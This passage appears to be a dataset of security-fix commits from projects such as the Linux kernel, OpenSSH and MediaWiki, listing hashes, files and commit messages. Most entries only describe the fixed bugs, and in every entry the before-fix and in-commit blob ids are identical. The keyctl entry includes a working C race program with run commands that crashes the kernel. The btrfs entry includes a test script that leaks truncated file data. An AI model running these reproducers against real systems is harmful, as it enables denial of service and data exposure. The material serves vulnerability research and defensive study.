    79cca974a4c2ab1199786732a67ff6d898051b78
File(s) In Commit: 
    miniupnpc/igd_desc_parse.c
Blob(s) In Commit: 
    d2999ad011c40d8b1a78208d42e9dff5ddd8d76f
Blob(s) Before Fix: 
    d2999ad011c40d8b1a78208d42e9dff5ddd8d76f
Projects:
    007jasonsmith_Catch
Commit Message for 79cca974a4c2ab1199786732a67ff6d898051b78:
igd_desc_parse.c: fix buffer overflow

======================================================================
Commit With Fix: 
    9d65a945029c7be7bb6bc893759e74c5636be694
File(s) In Commit: 
    simple-php-captcha.php
Blob(s) In Commit: 
    2547908771cea668dfc718da7fcc2f5916bce7e7
Blob(s) Before Fix: 
    2547908771cea668dfc718da7fcc2f5916bce7e7
Projects:
    0xIIDe231_php-captcha
Commit Message for 9d65a945029c7be7bb6bc893759e74c5636be694:
Merge pull request #17 from ALSchwalm/master\n\nSwitch from rand to mt_rand

======================================================================
Commit With Fix: 
    7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5
File(s) In Commit: 
    drivers/vhost/vhost.c
Blob(s) In Commit: 
    95bdb90fd7f06a13a99e2d37a2c97aabc4545c05
Blob(s) Before Fix: 
    95bdb90fd7f06a13a99e2d37a2c97aabc4545c05
Projects:
    0-T-0_ps4-linux
Commit Message for 7932c0bd7740f4cd2aa168d3ce0199e7af7d72d5:
vhost: actually track log eventfd file\n\nWhile reviewing vhost log code, I found out that log_file is never set. Note: I haven't tested the change (QEMU doesn't use LOG_FD yet).\n\nCc: stable@vger.kernel.org Signed-off-by: Marc-André Lureau <marcandre.lureau@redhat.com> Signed-off-by: Michael S. Tsirkin <mst@redhat.com>

======================================================================
Commit With Fix: 
    9a5cbce421a283e6aea3c4007f141735bf9da8c3
File(s) In Commit: 
    arch/powerpc/perf/callchain.c
Blob(s) In Commit: 
    ead55351b2542accc663c496be8592b9c3942b08
Blob(s) Before Fix: 
    ead55351b2542accc663c496be8592b9c3942b08
Projects:
    0-T-0_ps4-linux
Commit Message for 9a5cbce421a283e6aea3c4007f141735bf9da8c3:
powerpc/perf: Cap 64bit userspace backtraces to PERF_MAX_STACK_DEPTH\n\nWe cap 32bit userspace backtraces to PERF_MAX_STACK_DEPTH (currently 127), but we forgot to do the same for 64bit backtraces.\n\nCc: stable@vger.kernel.org Signed-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    5e75f5198769056089fb06c4d738ab0e5abc66f7
File(s) In Commit: 
    monitor.c
Blob(s) In Commit: 
    a91420983ba86eda2619e629265897b3fefed53a
Blob(s) Before Fix: 
    a91420983ba86eda2619e629265897b3fefed53a
Projects:
    0-T-0_docker
    0neday_openssh-portable
Commit Message for 5e75f5198769056089fb06c4d738ab0e5abc66f7:
set sshpam_ctxt to NULL after free\n\nAvoids use-after-free in monitor when privsep child is compromised. Reported by Moritz Jodeit  ok dtucker@

======================================================================
Commit With Fix: 
    5faabfa1bbf65536ea36108887040198afcb3c82
File(s) In Commit: 
    includes/specials/SpecialDeletedContributions.php
Blob(s) In Commit: 
    44352a78b5023fa92de9ac8307737e5eaaea19fc
Blob(s) Before Fix: 
    44352a78b5023fa92de9ac8307737e5eaaea19fc
Projects:
    0x047d_mediawiki
Commit Message for 5faabfa1bbf65536ea36108887040198afcb3c82:
SECURITY: Don't disclose if an IP is autoblocked on Special:DeletedContributions\n\nSame patch as dc2966bd05b, just for Special:DeletedContributions this time.\n\nBug: T106893 Change-Id: I2089b21fc379b612fe9bf087b5f4ea75052bdbd3

======================================================================
Commit With Fix: 
    7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38
File(s) In Commit: 
    src/client.c
Blob(s) In Commit: 
    2b01ff2ccdb45089055fa35d22f79ffa17f4761e
Blob(s) Before Fix: 
    2b01ff2ccdb45089055fa35d22f79ffa17f4761e
Projects:
    CartoDB_pgbouncer
Commit Message for 7ca3e5279d05fceb1e8a043c6f5b6f58dea3ed38:
Remove too early set of auth_user\n\nWhen query returns 0 rows (user not found), this user stays as login user...\n\nShould fix #69.

======================================================================
Commit With Fix: 
    74e98eb085889b0d2d4908f59f6e00026063014f
File(s) In Commit: 
    net/rds/connection.c
Blob(s) In Commit: 
    49adeef8090caea90be3e42702276314bca1d118
Blob(s) Before Fix: 
    49adeef8090caea90be3e42702276314bca1d118
Projects:
    0-T-0_ps4-linux
Commit Message for 74e98eb085889b0d2d4908f59f6e00026063014f:
RDS: verify the underlying transport exists before creating a connection\n\nThere was no verification that an underlying transport exists when creating a connection, this would cause dereferencing a NULL ptr.\n\nIt might happen on sockets that weren't properly bound before attempting to send a message, which will cause a NULL ptr deref:\n\n[135546.047719] kasan: GPF could be caused by NULL-ptr deref or user memory accessgeneral protection fault: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN [135546.051270] Modules linked in: [135546.051781] CPU: 4 PID: 15650 Comm: trinity-c4 Not tainted 4.2.0-next-20150902-sasha-00041-gbaa1222-dirty #2527 [135546.053217] task: ffff8800835bc000 ti: ffff8800bc708000 task.ti: ffff8800bc708000 [135546.054291] RIP: __rds_conn_create (net/rds/connection.c:194) [135546.055666] RSP: 0018:ffff8800bc70fab0  EFLAGS: 00010202 [135546.056457] RAX: dffffc0000000000 RBX: 0000000000000f2c RCX: ffff8800835bc000 [135546.057494] RDX: 0000000000000007 RSI: ffff8800835bccd8 RDI: 0000000000000038 [135546.058530] RBP: ffff8800bc70fb18 R08: 0000000000000001 R09: 0000000000000000 [135546.059556] R10: ffffed014d7a3a23 R11: ffffed014d7a3a21 R12: 0000000000000000 [135546.060614] R13: 0000000000000001 R14: ffff8801ec3d0000 R15: 0000000000000000 [135546.061668] FS:  00007faad4ffb700(0000) GS:ffff880252000000(0000) knlGS:0000000000000000 [135546.062836] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [135546.063682] CR2: 000000000000846a CR3: 000000009d137000 CR4: 00000000000006a0 [135546.064723] Stack: [135546.065048]  ffffffffafe2055c ffffffffafe23fc1 ffffed00493097bf ffff8801ec3d0008 [135546.066247]  0000000000000000 00000000000000d0 0000000000000000 ac194a24c0586342 [135546.067438]  1ffff100178e1f78 ffff880320581b00 ffff8800bc70fdd0 ffff880320581b00 [135546.068629] Call Trace: [135546.069028] ? __rds_conn_create (include/linux/rcupdate.h:856 net/rds/connection.c:134) [135546.069989] ? rds_message_copy_from_user (net/rds/message.c:298) [135546.071021] rds_conn_create_outgoing (net/rds/connection.c:278) [135546.071981] rds_sendmsg (net/rds/send.c:1058) [135546.072858] ? perf_trace_lock (include/trace/events/lock.h:38) [135546.073744] ? lockdep_init (kernel/locking/lockdep.c:3298) [135546.074577] ? rds_send_drop_to (net/rds/send.c:976) [135546.075508] ? __might_fault (./arch/x86/include/asm/current.h:14 mm/memory.c:3795) [135546.076349] ? __might_fault (mm/memory.c:3795) [135546.077179] ? rds_send_drop_to (net/rds/send.c:976) [135546.078114] sock_sendmsg (net/socket.c:611 net/socket.c:620) [135546.078856] SYSC_sendto (net/socket.c:1657) [135546.079596] ? SYSC_connect (net/socket.c:1628) [135546.080510] ? trace_dump_stack (kernel/trace/trace.c:1926) [135546.081397] ? ring_buffer_unlock_commit (kernel/trace/ring_buffer.c:2479 kernel/trace/ring_buffer.c:2558 kernel/trace/ring_buffer.c:2674) [135546.082390] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.083410] ? trace_event_raw_event_sys_enter (include/trace/events/syscalls.h:16) [135546.084481] ? do_audit_syscall_entry (include/trace/events/syscalls.h:16) [135546.085438] ? trace_buffer_unlock_commit (kernel/trace/trace.c:1749) [135546.085515] rds_ib_laddr_check(): addr 36.74.25.172 ret -99 node type -1\n\nAcked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: Sasha Levin <sasha.levin@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c0689e32154c41f59840ae10ffc5fbfa30618710
File(s) In Commit: 
    salt/states/user.py
Blob(s) In Commit: 
    b31ec0c69b567e2604201452c9f12a1e1206a426
Blob(s) Before Fix: 
    b31ec0c69b567e2604201452c9f12a1e1206a426
Projects:
    0decimal0_salt
Commit Message for c0689e32154c41f59840ae10ffc5fbfa30618710:
Replaced password with redacted when displayed

======================================================================
Commit With Fix: 
    ce68a88293ce3b18c261312392ad33a88bb69ea1
File(s) In Commit: 
    lib/gollum/app.rb
Blob(s) In Commit: 
    3fde8bf27fea852650b8a1ecd0f36be1c574c8b7
Blob(s) Before Fix: 
    3fde8bf27fea852650b8a1ecd0f36be1c574c8b7
Projects:
    0bit_gollum
Commit Message for ce68a88293ce3b18c261312392ad33a88bb69ea1:
Added security check.

======================================================================
Commit With Fix: 
    c9b92530a723ac5ef8e352885a1862b18f31b2f5
File(s) In Commit: 
    fs/ext4/namei.c
Blob(s) In Commit: 
    8f4bda75122e749e9b138a1b22e206c34ecfc0e8
Blob(s) Before Fix: 
    8f4bda75122e749e9b138a1b22e206c34ecfc0e8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c9b92530a723ac5ef8e352885a1862b18f31b2f5:
ext4: make orphan functions be no-op in no-journal mode\n\nInstead of checking whether the handle is valid, we check if journal is enabled. This avoids taking the s_orphan_lock mutex in all cases when there is no journal in use, including the error paths where ext4_orphan_del() is called with a handle set to NULL.\n\nSigned-off-by: Anatol Pomozov <anatol.pomozov@gmail.com> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu>

======================================================================
Commit With Fix: 
    cb31827d62066a04b02111df3052949fda4b6888
File(s) In Commit: 
    src/nss-mymachines/nss-mymachines.c
Blob(s) In Commit: 
    c98a959b3b6d8af3c2df6a90e60cb9df64c94b74
Blob(s) Before Fix: 
    c98a959b3b6d8af3c2df6a90e60cb9df64c94b74
Projects:
    0x277F_systemd
Commit Message for cb31827d62066a04b02111df3052949fda4b6888:
nss-mymachines: do not allow overlong machine names\n\nhttps://github.com/systemd/systemd/issues/2002

======================================================================
Commit With Fix: 
    0185604c2d82c560dab2f2933a18f797e74ab5a8
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    7ffc224bbe4127a90ef7741f09ae94f75e17feec
Blob(s) Before Fix: 
    7ffc224bbe4127a90ef7741f09ae94f75e17feec
Projects:
    0-T-0_ps4-linux
Commit Message for 0185604c2d82c560dab2f2933a18f797e74ab5a8:
KVM: x86: Reload pit counters for all channels when restoring state\n\nCurrently if userspace restores the pit counters with a count of 0 on channels 1 or 2 and the guest attempts to read the count on those channels, then KVM will perform a mod of 0 and crash.  This will ensure that 0 values are converted to 65536 as per the spec.\n\nThis is CVE-2015-7513.\n\nSigned-off-by: Andy Honig <ahonig@google.com> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    8e20cf2bce122ce9262d6034ee5d5b76fbb92f96
File(s) In Commit: 
    drivers/input/tablet/aiptek.c
Blob(s) In Commit: 
    78ca44840d60cac1467c90cb563cedf2a05fcaab
Blob(s) Before Fix: 
    78ca44840d60cac1467c90cb563cedf2a05fcaab
Projects:
    0-T-0_ps4-linux
Commit Message for 8e20cf2bce122ce9262d6034ee5d5b76fbb92f96:
Input: aiptek - fix crash on detecting device without endpoints\n\nThe aiptek driver crashes in aiptek_probe() when a specially crafted USB device without endpoints is detected. This fix adds a check that the device has proper configuration expected by the driver. Also an error return value is changed to more matching one in one of the error paths.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    570b5e854cecddd44d2047c44126aed951b61718
File(s) In Commit: 
    lib/colorscore/histogram.rb
Blob(s) In Commit: 
    4debcd58f82d658c6fc91e21e1b230081bcc0b04
Blob(s) Before Fix: 
    4debcd58f82d658c6fc91e21e1b230081bcc0b04
Projects:
    cle61_colorscore
Commit Message for 570b5e854cecddd44d2047c44126aed951b61718:
Fix CVE-2015-7541\n\nAvoid passsing possible user input directly into the shell. Instead quote the `image_path` value before calling the `convert` command.\n\nSee here http://rubysec.com/advisories/CVE-2015-7541/ for more information.

======================================================================
Commit With Fix: 
    b4a1b4f5047e4f54e194681125c74c0aa64d637d
File(s) In Commit: 
    security/keys/keyctl.c
Blob(s) In Commit: 
    1c3872aeed14ace421a9d43fc396c43afdd5b93c
Blob(s) Before Fix: 
    1c3872aeed14ace421a9d43fc396c43afdd5b93c
Projects:
    0-T-0_ps4-linux
Commit Message for b4a1b4f5047e4f54e194681125c74c0aa64d637d:
KEYS: Fix race between read and revoke\n\nThis fixes CVE-2015-7550.\n\nThere's a race between keyctl_read() and keyctl_revoke().  If the revoke happens between keyctl_read() checking the validity of a key and the key's semaphore being taken, then the key type read method will see a revoked key.\n\nThis causes a problem for the user-defined key type because it assumes in its read method that there will always be a payload in a non-revoked key and doesn't check for a NULL pointer.\n\nFix this by making keyctl_read() check the validity of a key after taking semaphore instead of before.\n\nI think the bug was introduced with the original keyrings code.\n\nThis was discovered by a multithreaded test program generated by syzkaller (http://github.com/google/syzkaller).  Here's a cleaned up version:\n\n	#include <sys/types.h> 	#include <keyutils.h> 	#include <pthread.h> 	void *thr0(void *arg) 	{ 		key_serial_t key = (unsigned long)arg  		keyctl_revoke(key)  		return 0  	} 	void *thr1(void *arg) 	{ 		key_serial_t key = (unsigned long)arg  		char buffer[16]  		keyctl_read(key, buffer, 16)  		return 0  	} 	int main() 	{ 		key_serial_t key = add_key("user", "%", "foo", 3, KEY_SPEC_USER_KEYRING)  		pthread_t th[5]  		pthread_create(&th[0], 0, thr0, (void *)(unsigned long)key)  		pthread_create(&th[1], 0, thr1, (void *)(unsigned long)key)  		pthread_create(&th[2], 0, thr0, (void *)(unsigned long)key)  		pthread_create(&th[3], 0, thr1, (void *)(unsigned long)key)  		pthread_join(th[0], 0)  		pthread_join(th[1], 0)  		pthread_join(th[2], 0)  		pthread_join(th[3], 0)  		return 0  	}\n\nBuild as:\n\n	cc -o keyctl-race keyctl-race.c -lkeyutils -lpthread\n\nRun as:\n\n	while keyctl-race  do :  done\n\nas it may need several iterations to crash the kernel.  The crash can be summarised as:\n\n	BUG: unable to handle kernel NULL pointer dereference at 0000000000000010 	IP: [<ffffffff81279b08>] user_read+0x56/0xa3 	... 	Call Trace: 	 [<ffffffff81276aa9>] keyctl_read_key+0xb6/0xd7 	 [<ffffffff81277815>] SyS_keyctl+0x83/0xe0 	 [<ffffffff815dbb97>] entry_SYSCALL_64_fastpath+0x12/0x6f\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    cb3232138e37129e88240a98a1d2aba2187ff57c
File(s) In Commit: 
    drivers/usb/serial/visor.c
Blob(s) In Commit: 
    337a0be89fcf0767f67731a9b0a50700e1df9318
Blob(s) Before Fix: 
    337a0be89fcf0767f67731a9b0a50700e1df9318
Projects:
    0-T-0_ps4-linux
Commit Message for cb3232138e37129e88240a98a1d2aba2187ff57c:
USB: serial: visor: fix crash on detecting device without write_urbs\n\nThe visor driver crashes in clie_5_attach() when a specially crafted USB device without bulk-out endpoint is detected. This fix adds a check that the device has proper configuration expected by the driver.\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Fixes: cfb8da8f69b8 ("USB: visor: fix initialisation of UX50/TH55 devices") Cc: stable <stable@vger.kernel.org> Signed-off-by: Johan Hovold <johan@kernel.org>

======================================================================
Commit With Fix: 
    84b9615ae7fe233c40a80bf749085caaef6f4919
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    5cea4cf870b650ff89dc10b94c83592d306b76ae
Blob(s) Before Fix: 
    5cea4cf870b650ff89dc10b94c83592d306b76ae
Projects:
    Tharre_void
Commit Message for 84b9615ae7fe233c40a80bf749085caaef6f4919:
Merge pull request #18 from g-sato/fix_security_bug\n\nSecurity fix

======================================================================
Commit With Fix: 
    4b2b64d5a6ebc84214755ebccd599baef7c1b798
File(s) In Commit: 
    arch/x86/kernel/kexec-bzimage64.c
Blob(s) In Commit: 
    61827eeb6881f429d2a7f625f541b6eaee4a05be
Blob(s) Before Fix: 
    61827eeb6881f429d2a7f625f541b6eaee4a05be
Projects:
    0-T-0_ps4-linux
Commit Message for 4b2b64d5a6ebc84214755ebccd599baef7c1b798:
kexec/uefi: copy secure_boot flag in boot params across kexec reboot\n\nKexec reboot in case secure boot being enabled does not keep the secure boot mode in new kernel, so later one can load unsigned kernel via legacy kexec_load.  In this state, the system is missing the protections provided by secure boot. Adding a patch to fix this by retain the secure_boot flag in original kernel.\n\nsecure_boot flag in boot_params is set in EFI stub, but kexec bypasses the stub. Fixing this issue by copying secure_boot flag across kexec reboot.\n\nSigned-off-by: Dave Young <dyoung@redhat.com>

======================================================================
Commit With Fix: 
    eda98796aff0d9bf41094b06811f5def3b4c333c
File(s) In Commit: 
    drivers/media/platform/vivid/vivid-osd.c
Blob(s) In Commit: 
    e15eef6a94e5585ad93a0dc81dcde54563f1aff6
Blob(s) Before Fix: 
    e15eef6a94e5585ad93a0dc81dcde54563f1aff6
Projects:
    0-T-0_ps4-linux
Commit Message for eda98796aff0d9bf41094b06811f5def3b4c333c:
[media] media/vivid-osd: fix info leak in ioctl\n\nThe vivid_fb_ioctl() code fails to initialize the 16 _reserved bytes of struct fb_vblank after the ->hcount member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Hans Verkuil <hans.verkuil@cisco.com> Signed-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>

======================================================================
Commit With Fix: 
    4b6184336ebb5c8dc1eae7f7ab46ee608a748b05
File(s) In Commit: 
    drivers/staging/dgnc/dgnc_mgmt.c
Blob(s) In Commit: 
    518fbd5e2d0e20159ba4b548b92e418b67c36858
Blob(s) Before Fix: 
    518fbd5e2d0e20159ba4b548b92e418b67c36858
Projects:
    0-T-0_ps4-linux
Commit Message for 4b6184336ebb5c8dc1eae7f7ab46ee608a748b05:
staging/dgnc: fix info leak in ioctl\n\nThe dgnc_mgmt_ioctl() code fails to initialize the 16 _reserved bytes of struct digi_dinfo after the ->dinfo_nboards member. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Salva Peiró <speirofr@gmail.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    668a9bbe7033f3f475576209305eb57a54306d29
File(s) In Commit: 
    src/type/s2k.js
Blob(s) In Commit: 
    e4d0fab79b72e29ef9021ad8887542f5a4f50b06
Blob(s) Before Fix: 
    e4d0fab79b72e29ef9021ad8887542f5a4f50b06
Projects:
    053803_openpgpjs
Commit Message for 668a9bbe7033f3f475576209305eb57a54306d29:
Throw exception on unsupported S2K type.

======================================================================
Commit With Fix: 
    2e86ae5f81da11f11673d0546efb525af02b7786
File(s) In Commit: 
    libexfat/mount.c
Blob(s) In Commit: 
    f25d71d6152568c370d334b622fc1856d9b6b1ba
Blob(s) Before Fix: 
    f25d71d6152568c370d334b622fc1856d9b6b1ba
Projects:
    8953caf_platform_external_exfat
Commit Message for 2e86ae5f81da11f11673d0546efb525af02b7786:
Check sector and cluster size before use.\n\nOtherwise malformed FS can cause heap corruption.

======================================================================
Commit With Fix: 
    950d9e0e4ee46efa41e791eac6cd55d2f558c3c9
File(s) In Commit: 
    textpattern/include/txp_article.php
Blob(s) In Commit: 
    a1de6a6ddb8cb82d33526cbbc2d7f7d0662120b0
Blob(s) Before Fix: 
    a1de6a6ddb8cb82d33526cbbc2d7f7d0662120b0
Projects:
    Acidburn0zzz_textpattern
Commit Message for 950d9e0e4ee46efa41e791eac6cd55d2f558c3c9:
Do not allow unprivileged authors to modify an existing article's markup setting.\n\nRefs #558.

======================================================================
Commit With Fix: 
    cbdb967af3d54993f5814f1cee0ed311a055377d
File(s) In Commit: 
    arch/x86/kvm/svm.c
Blob(s) In Commit: 
    1cc1ffca0d8c3fe9693a0b4f6d23cddfcc81e826
Blob(s) Before Fix: 
    1cc1ffca0d8c3fe9693a0b4f6d23cddfcc81e826
Projects:
    0-T-0_ps4-linux
Commit Message for cbdb967af3d54993f5814f1cee0ed311a055377d:
KVM: svm: unconditionally intercept #DB\n\nThis is needed to avoid the possibility that the guest triggers an infinite stream of #DB exceptions (CVE-2015-8104).\n\nVMX is not affected: because it does not save DR6 in the VMCS, it already intercepts #DB unconditionally.\n\nReported-by: Jan Beulich <jbeulich@suse.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    77751427a1ff25b27d47a4c36b12c3c8667855ac
File(s) In Commit: 
    net/ipv6/addrconf.c
Blob(s) In Commit: 
    b6030025f41197efbcdfd1d8c013e469413550b5
Blob(s) Before Fix: 
    b6030025f41197efbcdfd1d8c013e469413550b5
Projects:
    0-T-0_ps4-linux
Commit Message for 77751427a1ff25b27d47a4c36b12c3c8667855ac:
ipv6: addrconf: validate new MTU before applying it\n\nCurrently we don't check if the new MTU is valid or not and this allows one to configure a smaller than minimum allowed by RFCs or even bigger than interface own MTU, which is a problem as it may lead to packet drops.\n\nIf you have a daemon like NetworkManager running, this may be exploited by remote attackers by forging RA packets with an invalid MTU, possibly leading to a DoS. (NetworkManager currently only validates for values too small, but not for too big ones.)\n\nThe fix is just to make sure the new value is valid. That is, between IPV6_MIN_MTU and interface's MTU.\n\nNote that similar check is already performed at ndisc_router_discovery(), for when kernel itself parses the RA.\n\nSigned-off-by: Marcelo Ricardo Leitner <mleitner@redhat.com> Signed-off-by: Sabrina Dubroca <sd@queasysnail.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b400b976d81140f6971132e94eb7657b5b0a2b87
File(s) In Commit: 
    lib/IPTables/Parse.pm
Blob(s) In Commit: 
    cbd2042cb352f1da1493f779733f6ba49b2aba06
Blob(s) Before Fix: 
    cbd2042cb352f1da1493f779733f6ba49b2aba06
Projects:
    mrash_fwsnort
Commit Message for b400b976d81140f6971132e94eb7657b5b0a2b87:
Don't use predictable names for temporary files\n\nThis allows an attacker on a multi-user system to set up symlinks to overwrite any file the current user has write access to.\n\nDon't recommend users of this module to use predictable names either.

======================================================================
Commit With Fix: 
    c096dde88ff02872ba35edc4dc403c80a7867b5c
File(s) In Commit: 
    app/views/timelog/_form.html.erb
Blob(s) In Commit: 
    0dbff35a7edf9e729577f37d52206e389ffa4437
Blob(s) Before Fix: 
    0dbff35a7edf9e729577f37d52206e389ffa4437
Projects:
    01022012_redmine
Commit Message for c096dde88ff02872ba35edc4dc403c80a7867b5c:
Fixed that time logging form may disclose subjects of issues that are not visible (#21150).\n\nPatch by Holger Just.\n\ngit-svn-id: http://svn.redmine.org/redmine/trunk@14795 e93f8b46-1217-0410-a6f0-8f06a7374b81

======================================================================
Commit With Fix: 
    0305cd5f7fca85dae392b9ba85b116896eb7c1c7
File(s) In Commit: 
    fs/btrfs/inode.c
Blob(s) In Commit: 
    cbb4286490a1283b0d71bb4e26aad0987ec3b82e
Blob(s) Before Fix: 
    cbb4286490a1283b0d71bb4e26aad0987ec3b82e
Projects:
    0-T-0_ps4-linux
Commit Message for 0305cd5f7fca85dae392b9ba85b116896eb7c1c7:
Btrfs: fix truncation of compressed and inlined extents\n\nWhen truncating a file to a smaller size which consists of an inline extent that is compressed, we did not discard (or made unusable) the data between the new file size and the old file size, wasting metadata space and allowing for the truncated data to be leaked and the data corruption/loss mentioned below. We were also not correctly decrementing the number of bytes used by the inode, we were setting it to zero, giving a wrong report for callers of the stat(2) syscall. The fsck tool also reported an error about a mismatch between the nbytes of the file versus the real space used by the file.\n\nNow because we weren't discarding the truncated region of the file, it was possible for a caller of the clone ioctl to actually read the data that was truncated, allowing for a security breach without requiring root access to the system, using only standard filesystem operations. The scenario is the following:\n\n   1) User A creates a file which consists of an inline and compressed       extent with a size of 2000 bytes - the file is not accessible to       any other users (no read, write or execution permission for anyone       else) \n\n   2) The user truncates the file to a size of 1000 bytes \n\n   3) User A makes the file world readable \n\n   4) User B creates a file consisting of an inline extent of 2000 bytes \n\n   5) User B issues a clone operation from user A's file into its own       file (using a length argument of 0, clone the whole range) \n\n   6) User B now gets to see the 1000 bytes that user A truncated from       its file before it made its file world readbale. User B also lost       the bytes in the range [1000, 2000[ bytes from its own file, but       that might be ok if his/her intention was reading stale data from       user A that was never supposed to be public.\n\nNote that this contrasts with the case where we truncate a file from 2000 bytes to 1000 bytes and then truncate it back from 1000 to 2000 bytes. In this case reading any byte from the range [1000, 2000[ will return a value of 0x00, instead of the original data.\n\nThis problem exists since the clone ioctl was added and happens both with and without my recent data loss and file corruption fixes for the clone ioctl (patch "Btrfs: fix file corruption and data loss after cloning inline extents").\n\nSo fix this by truncating the compressed inline extents as we do for the non-compressed case, which involves decompressing, if the data isn't already in the page cache, compressing the truncated version of the extent, writing the compressed content into the inline extent and then truncate it.\n\nThe following test case for fstests reproduces the problem. In order for the test to pass both this fix and my previous fix for the clone ioctl that forbids cloning a smaller inline extent into a larger one, which is titled "Btrfs: fix file corruption and data loss after cloning inline extents", are needed. Without that other fix the test fails in a different way that does not leak the truncated data, instead part of destination file gets replaced with zeroes (because the destination file has a larger inline extent than the source).\n\n  seq=`basename $0`   seqres=$RESULT_DIR/$seq   echo "QA output created by $seq"   tmp=/tmp/$$   status=1	# failure is the default!   trap "_cleanup  exit \$status" 0 1 2 3 15\n\n  _cleanup()   {       rm -f $tmp.*   }\n\n  # get standard environment, filters and checks   . ./common/rc   . ./common/filter\n\n  # real QA test starts here   _need_to_be_root   _supported_fs btrfs   _supported_os Linux   _require_scratch   _require_cloner\n\n  rm -f $seqres.full\n\n  _scratch_mkfs >>$seqres.full 2>&1   _scratch_mount "-o compress"\n\n  # Create our test files. File foo is going to be the source of a clone operation   # and consists of a single inline extent with an uncompressed size of 512 bytes,   # while file bar consists of a single inline extent with an uncompressed size of   # 256 bytes. For our test's purpose, it's important that file bar has an inline   # extent with a size smaller than foo's inline extent.   $XFS_IO_PROG -f -c "pwrite -S 0xa1 0 128"   \           -c "pwrite -S 0x2a 128 384" \           $SCRATCH_MNT/foo | _filter_xfs_io   $XFS_IO_PROG -f -c "pwrite -S 0xbb 0 256" $SCRATCH_MNT/bar | _filter_xfs_io\n\n  # Now durably persist all metadata and data. We do this to make sure that we get   # on disk an inline extent with a size of 512 bytes for file foo.   sync\n\n  # Now truncate our file foo to a smaller size. Because it consists of a   # compressed and inline extent, btrfs did not shrink the inline extent to the   # new size (if the extent was not compressed, btrfs would shrink it to 128   # bytes), it only updates the inode's i_size to 128 bytes.   $XFS_IO_PROG -c "truncate 128" $SCRATCH_MNT/foo\n\n  # Now clone foo's inline extent into bar.   # This clone operation should fail with errno EOPNOTSUPP because the source   # file consists only of an inline extent and the file's size is smaller than   # the inline extent of the destination (128 bytes < 256 bytes). However the   # clone ioctl was not prepared to deal with a file that has a size smaller   # than the size of its inline extent (something that happens only for compressed   # inline extents), resulting in copying the full inline extent from the source   # file into the destination file.   #   # Note that btrfs' clone operation for inline extents consists of removing the   # inline extent from the destination inode and copy the inline extent from the   # source inode into the destination inode, meaning that if the destination   # inode's inline extent is larger (N bytes) than the source inode's inline   # extent (M bytes), some bytes (N - M bytes) will be lost from the destination   # file. Btrfs could copy the source inline extent's data into the destination's   # inline extent so that we would not lose any data, but that's currently not   # done due to the complexity that would be needed to deal with such cases   # (specially when one or both extents are compressed), returning EOPNOTSUPP, as   # it's normally not a very common case to clone very small files (only case   # where we get inline extents) and copying inline extents does not save any   # space (unlike for normal, non-inlined extents).   $CLONER_PROG -s 0 -d 0 -l 0 $SCRATCH_MNT/foo $SCRATCH_MNT/bar\n\n  # Now because the above clone operation used to succeed, and due to foo's inline   # extent not being shinked by the truncate operation, our file bar got the whole   # inline extent copied from foo, making us lose the last 128 bytes from bar   # which got replaced by the bytes in range [128, 256[ from foo before foo was   # truncated - in other words, data loss from bar and being able to read old and   # stale data from foo that should not be possible to read anymore through normal   # filesystem operations. Contrast with the case where we truncate a file from a   # size N to a smaller size M, truncate it back to size N and then read the range   # [M, N[, we should always get the value 0x00 for all the bytes in that range.\n\n  # We expected the clone operation to fail with errno EOPNOTSUPP and therefore   # not modify our file's bar data/metadata. So its content should be 256 bytes   # long with all bytes having the value 0xbb.   #   # Without the btrfs bug fix, the clone operation succeeded and resulted in   # leaking truncated data from foo, the bytes that belonged to its range   # [128, 256[, and losing data from bar in that same range. So reading the   # file gave us the following content:   #   # 0000000 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1 a1   # *   # 0000200 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a 2a   # *   # 0000400   echo "File bar's content after the clone operation:"   od -t x1 $SCRATCH_MNT/bar\n\n  # Also because the foo's inline extent was not shrunk by the truncate   # operation, btrfs' fsck, which is run by the fstests framework everytime a   # test completes, failed reporting the following error:   #   #  root 5 inode 257 errors 400, nbytes wrong\n\n  status=0   exit\n\nCc: stable@vger.kernel.org Signed-off-by: Filipe Manana <fdmanana@suse.com>

======================================================================
Commit With Fix: 
    f1a5fce791e2392d5a23a6d62ab65c481cdd6a66
File(s) In Commit: 
    administration/robots.php
Blob(s) In Commit: 
    51b8496b9481fa0746e2b8a02ae8cefe7a9acd51
Blob(s) Before Fix: 
    51b8496b9481fa0746e2b8a02ae8cefe7a9acd51
